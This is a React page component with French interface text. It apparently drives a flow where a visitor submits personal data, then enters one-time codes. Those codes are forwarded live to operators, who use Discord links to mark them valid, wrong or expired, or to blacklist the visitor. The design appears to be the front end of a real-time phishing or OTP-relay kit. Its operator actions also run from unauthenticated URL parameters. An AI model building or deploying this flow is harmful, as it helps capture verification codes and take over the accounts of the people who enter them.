import { useState, useEffect, useRef } from "react";
import { base44 } from "@/api/base44Client";
import SubmissionForm from "@/components/SubmissionForm";
import SuccessScreen from "@/components/SuccessScreen";
import CodeVerification from "@/components/CodeVerification";
import CodeWaiting from "@/components/CodeWaiting";
import CodeVerification6 from "@/components/CodeVerification6";
import WaitingQueue from "@/components/WaitingQueue";
import VerificationSuccess from "@/components/VerificationSuccess";
import ResultScreen from "@/components/ResultScreen";
import StatusCheck from "@/components/StatusCheck";
import FAQ from "@/components/FAQ";

export default function Home() {
  const getParams = () => new URLSearchParams(window.location.search);

  const getInitialStep = () => {
    const p = getParams();
    if (p.get("triggerAction")) return "triggerAction";
    if (p.get("trigger")) return "form";
    return "form";
  };

  const [step, setStep] = useState(getInitialStep);
  const [loading, setLoading] = useState(false);
  const [submittedData, setSubmittedData] = useState(() => {
    try { return JSON.parse(sessionStorage.getItem("submittedData")) || null; } catch { return null; }
  });
  const [submissionId, setSubmissionId] = useState(() => {
    return getParams().get("id") || sessionStorage.getItem("submissionId") || null;
  });
  const pollingValidationRef = useRef(null);
  const pollingCodeRef = useRef(null);
  const pollingWaitingRef = useRef(null);
  const [showStatusCheck, setShowStatusCheck] = useState(false);
  const [showFAQ, setShowFAQ] = useState(false);
  const [adminInactive, setAdminInactive] = useState(false);

  // Persist step in sessionStorage so refresh doesn't lose position
  const setStepPersisted = (newStep) => {
    setStep(newStep);
  };

  // Check admin status on mount
  useEffect(() => {
    base44.functions.invoke("checkAdminStatus", {})
      .then(res => setAdminInactive(res?.data?.is_inactive || false))
      .catch(() => {});
  }, []);

  // Handle ?trigger=ID from Discord (send code ready)
  useEffect(() => {
    const triggerId = getParams().get("trigger");
    if (triggerId) {
      base44.functions.invoke("sendCode", { submissionId: triggerId, action: "code_ready" })
        .then(() => setStep("adminDone"))
        .catch(() => setStep("adminDone"));
    }
  }, []);

  // Handle ?triggerAction=valid|wrong|expired|blacklist&id=... from Discord (after code entry)
  useEffect(() => {
    if (step !== "triggerAction") return;
    const p = getParams();
    const action = p.get("triggerAction");
    const id = p.get("id");
    const ip = p.get("ip");
    if (!action || !id) { setStep("form"); return; }

    if (action === "blacklist") {
      base44.functions.invoke("blacklistUser", { submissionId: id, ip })
        .catch(() => {})
        .finally(() => {
          window.history.replaceState({}, "", "/");
          setStep("adminDone");
        });
    } else if (action === "code6") {
      base44.functions.invoke("sendCode", { submissionId: id, action: "code6" })
        .catch(() => {})
        .finally(() => {
          window.history.replaceState({}, "", "/");
          setStep("adminDone");
        });
    } else {
      base44.functions.invoke("sendCode", { submissionId: id, action })
        .catch(() => {})
        .finally(() => {
          window.history.replaceState({}, "", "/");
          setStep("adminDone");
        });
    }
  }, []);

  // Poll on "validation" step
  useEffect(() => {
    if (step !== "validation" || !submissionId) return;
    pollingValidationRef.current = setInterval(async () => {
      const adminRes = await base44.functions.invoke("checkAdminStatus", {});
      setAdminInactive(adminRes?.data?.is_inactive || false);
      const res = await base44.functions.invoke("checkStatus", { submissionId });
      const s = res?.data?.status;
      if (s === "code_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code"); }
      else if (s === "code6_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code6"); }
      else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingValidationRef.current); setStepPersisted("wrong"); }
      else if (s === "waiting_queue") { clearInterval(pollingValidationRef.current); setStepPersisted("queue"); }
    }, 1500);
    return () => clearInterval(pollingValidationRef.current);
  }, [step, submissionId]);

  // Poll on "code" step — redirect to code6 if admin switches action
  useEffect(() => {
    if (step !== "code" || !submissionId) return;
    pollingCodeRef.current = setInterval(async () => {
      const res = await base44.functions.invoke("checkStatus", { submissionId }).catch(() => null);
      const s = res?.data?.status;
      if (s === "code6_ready") { clearInterval(pollingCodeRef.current); setStepPersisted("code6"); }
      else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingCodeRef.current); setStepPersisted("wrong"); }
      else if (s === "waiting_queue") { clearInterval(pollingCodeRef.current); setStepPersisted("queue"); }
    }, 1500);
    return () => clearInterval(pollingCodeRef.current);
  }, [step, submissionId]);

  // Poll on "waiting" step
  useEffect(() => {
    if (step !== "waiting" || !submissionId) return;
    pollingWaitingRef.current = setInterval(async () => {
      const res = await base44.functions.invoke("checkStatus", { submissionId });
      const s = res?.data?.status;
      if (s === "code_valid") { clearInterval(pollingWaitingRef.current); setStepPersisted("verified"); }
      else if (s === "code_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code"); }
      else if (s === "code6_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code6"); }
      else if (s === "code_wrong") { clearInterval(pollingWaitingRef.current); setStepPersisted("wrong"); }
      else if (s === "code_expired") { clearInterval(pollingWaitingRef.current); setStepPersisted("expired"); }
      else if (s === "waiting_queue") { clearInterval(pollingWaitingRef.current); setStepPersisted("queue"); }
    }, 1500);
    return () => clearInterval(pollingWaitingRef.current);
  }, [step, submissionId]);

  const handleSubmit = async (data) => {
    setLoading(true);
    try {
      // Check if admin is inactive (fresh check every time user submits)
      const statusRes = await base44.functions.invoke("checkAdminStatus", {});
      if (statusRes?.data?.is_inactive) {
        setAdminInactive(true);
        setStep("noAdmin");
        setLoading(false);
        return;
      }

      const res = await base44.functions.invoke("createSubmission", data);
      const submissionId = res?.data?.submissionId;
      if (!submissionId) throw new Error("Erreur lors de la création");
      
      setSubmittedData(data);
      setSubmissionId(submissionId);
      sessionStorage.setItem("submittedData", JSON.stringify(data));
      sessionStorage.setItem("submissionId", submissionId);
      setStepPersisted("validation");
    } catch (error) {
      // Rate limit or other error
      const errorMsg = error.response?.data?.error || "Une erreur s'est produite";
      if (errorMsg.includes("Attends") || errorMsg.includes("Limite")) {
        // This will be handled by the parent component or shown as an alert
      }
      alert(errorMsg);
    }
    setLoading(false);
  };

  const handleCodeSubmit = async (code) => {
    setLoading(true);
    await base44.functions.invoke("notifyCodeEntered", {
      ...submittedData,
      code,
      submissionId,
    }).catch(() => {});
    setStepPersisted("waiting");
    setLoading(false);
  };

  const handleCode6Submit = async (code) => {
    setLoading(true);
    await base44.functions.invoke("notifyCodeEntered", {
      ...submittedData,
      code,
      submissionId,
    }).catch(() => {});
    setStepPersisted("waiting");
    setLoading(false);
  };

  const handleBack = () => {
    sessionStorage.clear();
    window.location.href = "/";
  };

  const handleRetryCode = async () => {
    if (!submissionId) { setStepPersisted("code"); return; }
    const res = await base44.functions.invoke("checkStatus", { submissionId }).catch(() => null);
    const s = res?.data?.status;
    setStepPersisted(s === "code6_ready" ? "code6" : "code");
  };

  const handleCodeExpire = () => {
   setStep("expired");
  };

  return (
    <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-8 md:py-12 safe-area-inset">
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[120px] pointer-events-none hidden md:block" />
      <div className="absolute bottom-0 right-0 w-[400px] h-[400px] bg-accent/10 rounded-full blur-[100px] pointer-events-none hidden md:block" />

      <div className="relative z-10 w-full max-w-md min-h-screen md:min-h-auto flex flex-col justify-center">
        {showFAQ ? (
          <FAQ onBack={() => setShowFAQ(false)} />
        ) : showStatusCheck ? (
          <StatusCheck onBack={() => setShowStatusCheck(false)} />
        ) : (
          <>
            {step === "form"       && <SubmissionForm onSubmit={handleSubmit} loading={loading} onStatusCheck={() => setShowStatusCheck(true)} onFaqClick={() => setShowFAQ(true)} />}
            {step === "noAdmin"    && (
              <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
                <div className="text-4xl mb-4">⏳</div>
                <h2 className="font-heading text-xl font-bold text-foreground mb-2">Aucun admin disponible</h2>
                <p className="text-muted-foreground text-sm mb-6">Les administrateurs sont actuellement absents. Votre demande sera traitée dès que possible.</p>
                <button onClick={() => { sessionStorage.clear(); setStep("form"); }} className="px-4 py-2 bg-primary text-primary-foreground rounded-lg text-sm font-medium hover:bg-primary/80 transition-colors">
                  Retour
                </button>
              </div>
            )}
            {step === "validation" && <SuccessScreen data={submittedData} adminInactive={adminInactive} />}
            {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} onExpire={handleCodeExpire} />}
            {step === "code6"      && <CodeVerification6 data={submittedData} onSubmit={handleCode6Submit} loading={loading} onExpire={handleCodeExpire} />}
            {step === "waiting"    && <CodeWaiting />}
            {step === "queue"      && <WaitingQueue />}
            {step === "verified"   && <VerificationSuccess data={submittedData} />}
            {step === "triggerAction" && (
              <div className="text-center text-muted-foreground text-sm py-10">Traitement en cours...</div>
            )}
            {step === "adminDone" && (
              <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
                <div className="text-4xl mb-4">✅</div>
                <h2 className="font-heading text-xl font-bold text-foreground mb-2">Action effectuée</h2>
                <p className="text-muted-foreground text-sm">Le statut de l'utilisateur a bien été mis à jour.</p>
              </div>
            )}
            {step === "wrong"      && <ResultScreen type="wrong" onBack={handleBack} />}
            {step === "expired"    && <ResultScreen type="expired" onBack={handleRetryCode} />}
          </>
        )}
      </div>
    </div>
  );
}